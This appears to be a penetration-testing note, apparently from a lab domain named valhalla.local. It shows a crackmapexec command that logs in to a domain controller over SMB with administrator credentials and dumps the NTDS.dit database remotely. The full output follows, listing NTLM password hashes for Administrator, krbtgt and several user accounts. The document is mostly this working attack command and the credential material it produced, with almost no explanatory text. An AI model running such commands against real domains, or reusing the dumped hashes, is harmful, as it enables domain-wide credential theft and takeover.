get ntds.dit content remotely

	┌──(kali㉿kali)-[~]
	└─$ crackmapexec smb 192.168.200.100 -u administrator -p Pass123! -d valhalla.local --ntds                                                                 2 ⨯
	SMB         192.168.200.100 445    ODIN             [*] Windows Server 2012 R2 Standard Evaluation 9600 x64 (name:ODIN) (domain:valhalla.local) (signing:True) (SMBv1:True)
	SMB         192.168.200.100 445    ODIN             [+] valhalla.local\administrator:Pass123! (Pwn3d!)
	SMB         192.168.200.100 445    ODIN             [+] Dumping the NTDS, this could take a while so go grab a redbull...
	SMB         192.168.200.100 445    ODIN             Administrator:500:aad3b435b51404eeaad3b435b51404ee:c718f548c75062ada93250db208d3178:::
	SMB         192.168.200.100 445    ODIN             Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
	SMB         192.168.200.100 445    ODIN             krbtgt:502:aad3b435b51404eeaad3b435b51404ee:c2d3b9268608fab2b14a8c78c36316aa:::
	SMB         192.168.200.100 445    ODIN             danj:1105:aad3b435b51404eeaad3b435b51404ee:00ddebfed240893a2412f62a23462221:::
	SMB         192.168.200.100 445    ODIN             adamb:1106:aad3b435b51404eeaad3b435b51404ee:00ddebfed240893a2412f62a23462221:::
	SMB         192.168.200.100 445    ODIN             alans:1107:aad3b435b51404eeaad3b435b51404ee:00ddebfed240893a2412f62a23462221:::
	SMB         192.168.200.100 445    ODIN             PC-WIN10$:des-cbc-md5:d5b5b9b65df43294
	SMB         192.168.200.100 445    ODIN             [+] Dumped 214 NTDS hashes to /home/kali/.cme/logs/ODIN_192.168.200.100_2021-09-22_181932.ntds of which 53 were added to the database
